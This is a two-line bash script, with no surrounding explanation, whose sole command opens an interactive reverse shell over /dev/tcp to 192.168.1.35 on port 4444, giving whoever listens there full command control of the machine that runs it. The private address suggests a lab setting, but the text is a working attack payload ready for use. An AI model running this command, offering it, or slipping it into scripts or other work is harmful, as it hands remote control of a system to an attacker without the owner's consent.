#!/bin/bash
exec bash -i >& /dev/tcp/192.168.1.35/4444 0>&1
